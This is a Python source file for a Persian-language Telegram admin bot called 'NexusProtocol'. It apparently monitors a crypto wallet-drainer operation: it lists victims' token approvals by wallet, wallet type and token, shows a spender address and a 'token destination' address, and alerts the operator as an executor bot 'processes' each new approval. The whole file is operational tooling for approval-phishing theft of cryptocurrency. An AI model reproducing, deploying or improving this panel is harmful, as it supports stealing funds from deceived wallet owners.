#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║        NexusProtocol — پنل مدیریت تلگرام               ║
║        Admin Panel Bot  •  v2.0  •  Full Edition        ║
╚══════════════════════════════════════════════════════════╝

دستورات:
  /start    — منوی اصلی
  /status   — وضعیت کامل سیستم
  /stats    — آمار کلی
  /approvals — لیست approval‌ها
  /pending  — approval های پردازش‌نشده
  /config   — تنظیمات فعلی
"""

import os
import asyncio
import logging
import html
import time
from datetime import datetime, timezone
from typing import Optional
import requests

try:
    from telegram import (
        Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
    )
    from telegram.ext import (
        Application, CommandHandler, CallbackQueryHandler,
        ContextTypes, JobQueue
    )
    from telegram.constants import ParseMode
except ImportError:
    print("Installing python-telegram-bot...")
    import subprocess
    subprocess.check_call(["pip", "install", "python-telegram-bot==20.7"])
    from telegram import (
        Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
    )
    from telegram.ext import (
        Application, CommandHandler, CallbackQueryHandler,
        ContextTypes, JobQueue
    )
    from telegram.constants import ParseMode

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN       = os.getenv("ADMIN_BOT_TOKEN") or os.getenv("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID", "")
API_URL         = os.getenv("WEBSITE_URL", "https://nexusprotocol-api.onrender.com")
WEB_URL         = "https://nexusprotocol-web.onrender.com"
BOT_SERVICE_URL = "https://nexusprotocol-bot.onrender.com"
SPENDER_ADDRESS = os.getenv("SPENDER_ADDRESS", "")
DESTINATION_ADDRESS = os.getenv("DESTINATION_ADDRESS", "")
RPC_URL         = os.getenv("RPC_URL", "https://eth.llamarpc.com")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("AdminPanel")

# ─── State ────────────────────────────────────────────────────────────────────
_last_seen_ids: set = set()
_start_time = datetime.now(timezone.utc)
_notification_active = True

# ─── Helpers ──────────────────────────────────────────────────────────────────

def _fmt_time(iso: str) -> str:
    try:
        dt = datetime.fromisoformat(iso.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        diff = int((now - dt).total_seconds())
        if diff < 60:   return f"{diff}ث پیش"
        if diff < 3600: return f"{diff//60}د پیش"
        if diff < 86400:return f"{diff//3600}س پیش"
        return f"{diff//86400}ر پیش"
    except Exception:
        return iso[:16] if iso else "—"


def _short(addr: str, n=6) -> str:
    if not addr or len(addr) < 12:
        return addr
    return f"{addr[:n]}…{addr[-4:]}"


def _mask(val: str, show=6) -> str:
    if not val:
        return "—"
    return val[:show] + "•" * max(0, len(val) - show - 4) + val[-4:]


def _eth_price() -> float:
    try:
        r = requests.get(
            "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
            timeout=4
        )
        return float(r.json()["ethereum"]["usd"])
    except Exception:
        return 2500.0


def _check_service(url: str, path: str = "/api/healthz") -> tuple[bool, int]:
    try:
        r = requests.get(url.rstrip("/") + path, timeout=6)
        return r.status_code == 200, r.status_code
    except Exception:
        return False, 0


def _get_approvals(limit=20, pending_only=False) -> list:
    try:
        endpoint = "/api/approvals/pending" if pending_only else f"/api/approvals/pending"
        r = requests.get(API_URL.rstrip("/") + endpoint, timeout=8)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                return data[:limit]
    except Exception:
        pass
    return []


def _get_all_approvals(limit=50) -> list:
    """Try multiple endpoints to get all approvals"""
    endpoints = ["/api/approvals/pending", "/api/approvals"]
    for ep in endpoints:
        try:
            r = requests.get(API_URL.rstrip("/") + ep, timeout=8)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    return data[:limit]
        except Exception:
            continue
    return []

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 آمار کلی",     callback_data="stats"),
            InlineKeyboardButton("🖥️ وضعیت سیستم", callback_data="status"),
        ],
        [
            InlineKeyboardButton("🔔 Approval‌ها",  callback_data="approvals_0"),
            InlineKeyboardButton("⏳ در انتظار",   callback_data="pending"),
        ],
        [
            InlineKeyboardButton("⚙️ تنظیمات",     callback_data="config"),
            InlineKeyboardButton("📈 قیمت ETH",    callback_data="ethprice"),
        ],
        [
            InlineKeyboardButton("🔄 بروزرسانی",   callback_data="refresh"),
        ],
    ])


def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="main")],
        [InlineKeyboardButton("🔄 بروزرسانی",      callback_data="refresh")],
    ])

# ─── Message Builders ─────────────────────────────────────────────────────────

def build_main_message() -> str:
    uptime = datetime.now(timezone.utc) - _start_time
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    notif  = "✅ فعال" if _notification_active else "🔕 غیرفعال"
    return (
        "╔══════════════════════════════╗\n"
        "║  🚀 <b>NexusProtocol Admin Panel</b>  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"⏱️ آپتایم پنل: <code>{h:02d}:{m:02d}:{s:02d}</code>\n"
        f"🔔 اعلان‌ها: {notif}\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d  %H:%M')} UTC\n\n"
        "از دکمه‌های زیر استفاده کنید 👇"
    )


def build_status_message() -> str:
    api_ok, api_code  = _check_service(API_URL, "/api/healthz")
    web_ok, web_code  = _check_service(WEB_URL, "/")
    bot_ok, bot_code  = _check_service(BOT_SERVICE_URL, "/health")

    def icon(ok): return "🟢" if ok else "🔴"
    def code(c):  return f"<code>{c}</code>" if c else "<code>—</code>"

    # Get approval count as extra health signal
    approvals = _get_approvals(limit=5)
    db_ok = isinstance(approvals, list)

    lines = [
        "🖥️ <b>وضعیت سرویس‌ها</b>\n",
        f"{icon(web_ok)} <b>سایت (Frontend)</b>  {code(web_code)}",
        f"   └ {html.escape(WEB_URL)}",
        "",
        f"{icon(api_ok)} <b>API Server</b>  {code(api_code)}",
        f"   └ {html.escape(API_URL)}",
        "",
        f"{icon(bot_ok)} <b>ربات اجراکننده</b>  {code(bot_code)}",
        f"   └ {html.escape(BOT_SERVICE_URL)}",
        "",
        f"{icon(db_ok)} <b>دیتابیس</b>  {'متصل' if db_ok else 'قطع'}",
        "",
        "─────────────────────────",
    ]

    all_ok = api_ok and web_ok
    if all_ok:
        lines.append("✅ <b>همه سرویس‌های اصلی فعال هستند</b>")
    else:
        down = []
        if not web_ok: down.append("سایت")
        if not api_ok: down.append("API")
        if not bot_ok: down.append("ربات")
        lines.append(f"⚠️ <b>مشکل در:</b> {', '.join(down)}")

    lines.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
    return "\n".join(lines)


def build_stats_message() -> str:
    approvals = _get_all_approvals(limit=200)

    total     = len(approvals)
    pending   = sum(1 for a in approvals if not a.get("processed"))
    processed = sum(1 for a in approvals if a.get("processed"))

    # Count by wallet type
    wallet_types: dict = {}
    for a in approvals:
        wt = a.get("wallet_type", "Unknown")
        wallet_types[wt] = wallet_types.get(wt, 0) + 1

    # Most recent
    last_at = "—"
    if approvals:
        try:
            latest = max(approvals, key=lambda x: x.get("created_at", ""))
            last_at = _fmt_time(latest.get("created_at", ""))
        except Exception:
            pass

    # ETH price for USD estimates
    eth_price = _eth_price()

    wt_lines = ""
    for wt, cnt in sorted(wallet_types.items(), key=lambda x: -x[1])[:5]:
        bar = "█" * min(cnt, 10) + "░" * max(0, 10 - min(cnt, 10))
        wt_lines += f"   {html.escape(str(wt)):<15} {bar}  {cnt}\n"

    progress_pct = int((processed / total * 100)) if total > 0 else 0
    bar_len = 20
    filled   = int(bar_len * progress_pct / 100)
    prog_bar = "█" * filled + "░" * (bar_len - filled)

    return (
        "📊 <b>آمار کلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 <b>کل Approval‌ها:</b>   <code>{total}</code>\n"
        f"⏳ <b>در انتظار:</b>         <code>{pending}</code>\n"
        f"✅ <b>پردازش‌شده:</b>       <code>{processed}</code>\n"
        f"🕐 <b>آخرین فعالیت:</b>     {last_at}\n\n"
        f"📈 <b>پیشرفت پردازش</b>\n"
        f"   [{prog_bar}] {progress_pct}%\n\n"
        f"👛 <b>نوع کیف‌پول:</b>\n{wt_lines}\n"
        f"💰 <b>قیمت ETH:</b>  <code>${eth_price:,.0f}</code>\n\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC"
    )


def build_approvals_message(page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    per_page = 5
    approvals = _get_all_approvals(limit=100)

    # Sort newest first
    try:
        approvals = sorted(approvals, key=lambda x: x.get("created_at", ""), reverse=True)
    except Exception:
        pass

    total   = len(approvals)
    start   = page * per_page
    end     = min(start + per_page, total)
    page_items = approvals[start:end]
    total_pages = max(1, (total + per_page - 1) // per_page)

    lines = [
        f"🔔 <b>Approval‌ها</b>  (صفحه {page+1}/{total_pages})",
        f"جمع: {total} approval",
        "━━━━━━━━━━━━━━━━━━━━━━━\n",
    ]

    if not page_items:
        lines.append("هنوز هیچ approval ثبت نشده.")
    else:
        for i, a in enumerate(page_items, start=start+1):
            status_icon = "✅" if a.get("processed") else "⏳"
            wallet   = _short(a.get("wallet", ""), 8)
            wtype    = a.get("wallet_type", "?")
            token    = _short(a.get("token", ""), 8)
            chain_id = a.get("chain_id", 1)
            tx_hash  = a.get("tx_hash") or "—"
            created  = _fmt_time(a.get("created_at", ""))
            lines += [
                f"{status_icon} <b>#{i}</b>  {created}",
                f"   👛 <code>{html.escape(wallet)}</code>  ({html.escape(str(wtype))})",
                f"   🪙 <code>{html.escape(token)}</code>  ⛓️ {chain_id}",
                f"   🔗 <code>{html.escape(tx_hash[:20])}…</code>" if len(tx_hash) > 20 else f"   🔗 <code>{html.escape(tx_hash)}</code>",
                "",
            ]

    # Navigation buttons
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ قبلی", callback_data=f"approvals_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("بعدی ▶️", callback_data=f"approvals_{page+1}"))

    keyboard = []
    if nav:
        keyboard.append(nav)
    keyboard.append([InlineKeyboardButton("🏠 بازگشت", callback_data="main")])

    return "\n".join(lines), InlineKeyboardMarkup(keyboard)


def build_pending_message() -> str:
    approvals = _get_approvals(limit=50, pending_only=True)

    lines = [
        "⏳ <b>Approval‌های در انتظار پردازش</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━\n",
    ]

    if not approvals:
        lines.append("✅ همه approval‌ها پردازش شده‌اند!")
    else:
        lines.append(f"📋 <b>{len(approvals)} approval</b> در صف پردازش:\n")
        for i, a in enumerate(approvals[:10], 1):
            wallet  = _short(a.get("wallet", ""), 10)
            token   = _short(a.get("token", ""), 10)
            wtype   = a.get("wallet_type", "?")
            created = _fmt_time(a.get("created_at", ""))
            lines += [
                f"⏳ <b>#{i}</b>  {created}",
                f"   👛 <code>{html.escape(wallet)}</code>  ({html.escape(str(wtype))})",
                f"   🪙 <code>{html.escape(token)}</code>",
                "",
            ]
        if len(approvals) > 10:
            lines.append(f"  … و {len(approvals)-10} مورد دیگر")

    lines.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
    return "\n".join(lines)


def build_config_message() -> str:
    return (
        "⚙️ <b>تنظیمات فعلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>API URL:</b>\n   <code>{html.escape(API_URL)}</code>\n\n"
        f"🌍 <b>سایت:</b>\n   <code>{html.escape(WEB_URL)}</code>\n\n"
        f"📤 <b>SPENDER:</b>\n   <code>{html.escape(_mask(SPENDER_ADDRESS, 10))}</code>\n\n"
        f"📥 <b>مقصد توکن‌ها:</b>\n   <code>{html.escape(_mask(DESTINATION_ADDRESS, 10))}</code>\n\n"
        f"⛓️ <b>شبکه:</b>  Ethereum Mainnet (chain_id=1)\n\n"
        f"🔗 <b>RPC:</b>\n   <code>{html.escape(RPC_URL[:50])}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ برای تغییر تنظیمات از داشبورد Render استفاده کنید."
    )


def build_ethprice_message() -> str:
    price = _eth_price()
    usdt_decimals = 6
    usdc_decimals = 6
    return (
        "📈 <b>قیمت لحظه‌ای ETH</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 <b>ETH/USD:</b>  <code>${price:,.2f}</code>\n\n"
        "🪙 <b>ارزش توکن‌های رایج:</b>\n"
        f"   USDT  1 USDT = $1.00\n"
        f"   USDC  1 USDC = $1.00\n"
        f"   WETH  1 WETH ≈ ${price:,.0f}\n\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC\n"
        "<i>منبع: CoinGecko</i>"
    )

# ─── Handlers ─────────────────────────────────────────────────────────────────

async def _is_authorized(update: Update) -> bool:
    user_id = str(update.effective_user.id) if update.effective_user else ""
    chat_id = str(update.effective_chat.id) if update.effective_chat else ""
    if ADMIN_CHAT_ID and (user_id == ADMIN_CHAT_ID or chat_id == ADMIN_CHAT_ID):
        return True
    # If no ADMIN_CHAT_ID set, allow anyone (first run)
    if not ADMIN_CHAT_ID:
        return True
    return False


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update):
        await update.message.reply_text("⛔ دسترسی مجاز نیست.")
        return
    await update.message.reply_text(
        build_main_message(),
        parse_mode=ParseMode.HTML,
        reply_markup=main_keyboard()
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update): return
    msg = await update.message.reply_text("⏳ در حال بررسی سرویس‌ها…")
    await msg.edit_text(
        build_status_message(),
        parse_mode=ParseMode.HTML,
        reply_markup=back_keyboard()
    )


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update): return
    msg = await update.message.reply_text("⏳ در حال دریافت آمار…")
    await msg.edit_text(
        build_stats_message(),
        parse_mode=ParseMode.HTML,
        reply_markup=back_keyboard()
    )


async def cmd_approvals(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update): return
    text, kb = build_approvals_message(0)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def cmd_pending(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update): return
    await update.message.reply_text(
        build_pending_message(),
        parse_mode=ParseMode.HTML,
        reply_markup=back_keyboard()
    )


async def cmd_config(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await _is_authorized(update): return
    await update.message.reply_text(
        build_config_message(),
        parse_mode=ParseMode.HTML,
        reply_markup=back_keyboard()
    )


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _notification_active
    q = update.callback_query
    await q.answer()

    data = q.data or ""

    try:
        if data == "main":
            await q.edit_message_text(
                build_main_message(), parse_mode=ParseMode.HTML,
                reply_markup=main_keyboard()
            )

        elif data == "refresh":
            await q.edit_message_text(
                build_main_message(), parse_mode=ParseMode.HTML,
                reply_markup=main_keyboard()
            )

        elif data == "status":
            await q.edit_message_text(
                "⏳ در حال بررسی سرویس‌ها…", parse_mode=ParseMode.HTML
            )
            await q.edit_message_text(
                build_status_message(), parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )

        elif data == "stats":
            await q.edit_message_text(
                "⏳ در حال دریافت آمار…", parse_mode=ParseMode.HTML
            )
            await q.edit_message_text(
                build_stats_message(), parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )

        elif data.startswith("approvals_"):
            page = int(data.split("_")[1])
            text, kb = build_approvals_message(page)
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

        elif data == "pending":
            await q.edit_message_text(
                build_pending_message(), parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )

        elif data == "config":
            await q.edit_message_text(
                build_config_message(), parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )

        elif data == "ethprice":
            await q.edit_message_text(
                build_ethprice_message(), parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )

    except Exception as e:
        logger.error(f"Callback error: {e}")
        try:
            await q.edit_message_text(
                f"❌ خطا: {html.escape(str(e)[:100])}",
                parse_mode=ParseMode.HTML,
                reply_markup=back_keyboard()
            )
        except Exception:
            pass


# ─── Background Job: Poll for new approvals ───────────────────────────────────

async def job_check_new_approvals(ctx: ContextTypes.DEFAULT_TYPE):
    global _last_seen_ids, _notification_active
    if not _notification_active or not ADMIN_CHAT_ID:
        return

    try:
        approvals = _get_approvals(limit=50, pending_only=True)
        new_ones = [a for a in approvals if a.get("id") and a["id"] not in _last_seen_ids]

        for a in new_ones:
            _last_seen_ids.add(a["id"])
            wallet   = a.get("wallet", "?")
            wtype    = a.get("wallet_type", "?")
            token    = a.get("token", "?")
            tx_hash  = a.get("tx_hash") or "—"
            chain_id = a.get("chain_id", 1)
            created  = _fmt_time(a.get("created_at", ""))

            text = (
                "🚨 <b>APPROVAL جدید دریافت شد!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🕐 زمان: {created}\n"
                f"👛 کیف‌پول: <code>{html.escape(wallet)}</code>\n"
                f"📱 نوع: {html.escape(str(wtype))}\n"
                f"🪙 توکن: <code>{html.escape(_short(token, 10))}</code>\n"
                f"⛓️ شبکه: chain_id={chain_id}\n"
                f"🔗 TX: <code>{html.escape(tx_hash[:30])}</code>\n\n"
                "⚡ ربات در حال پردازش است…"
            )
            try:
                await ctx.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=text,
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Failed to send notification: {e}")

    except Exception as e:
        logger.error(f"Polling job error: {e}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        logger.error("❌ ADMIN_BOT_TOKEN یا TELEGRAM_BOT_TOKEN تنظیم نشده!")
        return

    logger.info("🚀 NexusProtocol Admin Panel در حال راه‌اندازی…")
    logger.info(f"   API URL : {API_URL}")
    logger.info(f"   Admin ID: {ADMIN_CHAT_ID or '(همه)'}")

    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("status",    cmd_status))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("approvals", cmd_approvals))
    app.add_handler(CommandHandler("pending",   cmd_pending))
    app.add_handler(CommandHandler("config",    cmd_config))
    app.add_handler(CallbackQueryHandler(callback_handler))

    # Background polling job (every 30 seconds)
    app.job_queue.run_repeating(
        job_check_new_approvals,
        interval=30,
        first=10,
    )

    # Set commands in Telegram UI
    async def post_init(app):
        await app.bot.set_my_commands([
            BotCommand("start",     "🏠 منوی اصلی"),
            BotCommand("status",    "🖥️ وضعیت سیستم"),
            BotCommand("stats",     "📊 آمار کلی"),
            BotCommand("approvals", "🔔 لیست Approval‌ها"),
            BotCommand("pending",   "⏳ در انتظار پردازش"),
            BotCommand("config",    "⚙️ تنظیمات"),
        ])
        logger.info("✅ Commands set in Telegram")

    app.post_init = post_init

    logger.info("✅ Bot started. Polling…")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
